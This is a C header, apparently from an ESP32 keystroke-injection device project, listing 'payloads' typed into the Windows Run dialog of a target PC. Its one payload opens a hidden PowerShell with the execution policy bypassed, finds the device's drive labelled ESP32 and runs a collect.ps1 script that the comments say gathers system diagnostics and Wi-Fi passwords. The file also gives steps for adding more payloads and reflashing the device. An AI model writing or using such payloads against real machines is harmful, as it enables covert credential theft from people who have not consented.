#pragma once

// ─────────────────────────────────────────────────────────────────────────────
// payloads.h — Run-dialog commands sent to the target PC
//
// HOW TO ADD A NEW PAYLOAD
// ────────────────────────
// 1. Write your script and place it in scripts/
// 2. Add a command entry below (must be ≤220 chars for the Run dialog)
// 3. Rebuild: python tools/build_fs.py && python tools/flash_fs.py
// ─────────────────────────────────────────────────────────────────────────────

static const char* payloads[] = {

  // ── Payload 1: Full system diagnostics + Wi-Fi passwords ─────────────────
  "cmd /c start \"\" /min powershell -ExecutionPolicy Bypass -Command "
  "\"$d=(gwmi Win32_LogicalDisk|?{$_.VolumeName-eq'ESP32'}|"
  "select -First 1 -Exp DeviceID);& ($d+'\\collect.ps1')\""

};

static const int payloadCount = sizeof(payloads) / sizeof(payloads[0]);